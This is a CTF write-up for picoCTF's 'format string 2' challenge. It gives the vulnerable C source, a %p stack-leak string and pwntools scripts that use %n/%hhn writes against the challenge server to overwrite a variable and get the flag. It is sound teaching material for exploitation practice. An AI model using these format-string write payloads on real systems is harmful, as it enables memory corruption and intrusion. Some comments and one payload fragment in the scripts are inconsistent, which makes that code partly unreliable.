## Challenge Description

![Fmt-2-sc](/static/writeups/picoCTF/pwn/format-string-2/fmt2_chal_des.png)

## Solution

Before starting, I want to say that I am not an expert when it comes to binary exploitation. If you find mistakes in my write-ups, please let me know. I am open to any sort of constructive criticism.

Source code provided to us:

```c:vuln.c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];

  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

We want to make this if-statement true:

```c:If-Condition
if (sus == 0x67616c66)
```

But problem is the value of sus is `0x21737573`. So to solve this challenge, we basically have to overwrite the value of **`sus`** toÂ `0x67616c66`.

As **`printf()`** is being used, we can use **`%n`** format specifier to overwrite value of sus.

The **`%n`**Â modifier writes the amount of chars printed so far as an int to the address specified by the argument. Using theÂ **`$`**Â specifier we could also specify from exactly where we want to read this address. We could also send the addresses as input to the program which would put those addresses on the stack.

First we want to find the offset of our input string on the stack. For that, i will pass 8 â€˜Aâ€™ and will leak the addresses of the stack so that I can clearly see where the input is being stored:

```
AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
```

Here I can see that my offset is 14:

Now, I know that I also need to know what address to write to. In this case it can be found usingÂ **`objdump`**Â on the binary:

```bash:objdump-command
objdump -D ./vuln | grep "sus"
```

So, basically I want to overwrite addressÂ `0x404060`Â with the valueÂ `0x67616c66`. Letâ€™s start making our payload.

For creating the payload, I took help from a Guide on [Format String Bug](https://www.theflash2k.me/blog/ctf-techs/fsb-guide) written by my mentor [TheFlash2k](https://www.theflash2k.me/about). He has explain fmt in very detail.

He has also explain how to arbitrary write 4-bytes by passing one byte at a time. **[** _[Source](https://www.theflash2k.me/blog/ctf-techs/fsb-guide#writing-four-bytes)_ **]**

So the final payload that I created:

```python:final-payload
#!/usr/bin/env python3
from pwn import *

# Setting up terminal context for debugging
context.terminal = ["tmux", "splitw", "-h"]

# Executable and ELF setup
exe = "./vuln"
elf = context.binary = ELF(exe)

# If the GDB argument is provided, attach GDB to the process at the specified breakpoint
if args.GDB:
    io = process()
    gdb.attach(io, "b *main+231")

io = remote("rhea.picoctf.net", 61208)
io.recvuntil(b"?\n")

# Offset = 14
# 14 (Offset) + 5 (For payload) + 1 (Address to be written on)
start = 20

# Address of the variable to be overwritten, found using objdump and grep
sus = 0x404060

# Function to calculate the difference between two values modulo 256
diff_hhn = lambda i, j: ((i - j) % 256) # (0xFF+1)

payload = f"%{0x66}c%{start}$lln".encode()            # Writing 0x66 to memory
payload += f"c%{start+1}$hhn".encode()                # Writing 0x66 to sus[0]
payload += f"%{diff_hhn(0x66,0x61)}c%{start+2}$hhn".encode()  # Writing 0x61 to sus[3]
payload += f"%{diff_hhn(0x61,0x6c)}c%{start+3}$hhn".encode()  # Writing 0x6c to sus[2]
payload += b"||||||"                                  # Padding to align memory addresses
payload += p64(sus)                                   # Address of sus
payload += p64(sus+3)                                 # Address of sus[3]
payload += p64(sus+1)                                 # Address of sus[1]
payload += p64(sus+2)                                 # Address of sus[2]

io.sendline(payload)
io.interactive()
```

## Bonus

You can automate this whole process by using format string bug exploitation [tools](https://docs.pwntools.com/en/stable/fmtstr.html). The script will be:

```python:payload-crafted-using-exec_fmt-&-autofmt
from pwn import *

context.log_level = "critical"

context.terminal = ["tmux", "splitw", "-h"]
exe = "./vuln"
elf = context.binary = ELF(exe)
if args.GDB: gdb.attach(io, "b *main+231")

#io = process()
io = remote("rhea.picoctf.net", 61208)

def exec_fmt(payload):
    io = remote('rhea.picoctf.net', 61208)
    io.sendline(payload)
    return io.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

io.sendline(payload)

flag = io.recvuntil('}').split(b"...\n")[1]
flag = flag.decode('utf-8')

print(" ")
print("Flag:", flag)
print(" ")

io.interactive()
```

This script uses the `exec_fmt`, `autofmt` to find the offset for the payload and to find the address useÂ `objump -D vuln`Â (as we did earlier).
